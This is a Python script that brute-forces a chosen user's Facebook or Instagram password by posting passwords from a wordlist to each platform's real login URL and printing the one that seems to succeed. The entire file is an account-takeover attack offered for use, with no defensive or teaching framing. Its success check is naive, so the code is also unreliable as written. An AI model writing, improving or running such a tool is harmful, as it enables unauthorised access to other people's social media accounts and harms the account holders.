import requests

def brute_force_attack(username, wordlist_path, platform):
    with open(wordlist_path, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        if platform.lower() == 'facebook':
            url = 'https://web.facebook.com/login.php/?_rdc=1&_rdr&wtsid=rdr_0H7AcvsvJLCMaP4gT'
        elif platform.lower() == 'instagram':
            url = 'https://www.instagram.com/accounts/login/'
        else:
            print("Unsupported platform. Please use 'facebook' or 'instagram'.")
            return

        # Simulating a login attempt
        response = requests.post(url, data={'username': username, 'password': password})

        if 'success' in response.text.lower():
            print(f'Success! The password for {username} is: {password}')
            return
        else:
            print(f'Attempt with password: {password} failed.')

    print('All password attempts have been exhausted.')

if __name__ == "__main__":
    user = input("Enter the username: ")
    wordlist = input("Enter the path to the wordlist.txt: ")
    platform_choice = input("Enter the platform (facebook/instagram): ")
    brute_force_attack(user, wordlist, platform_choice)
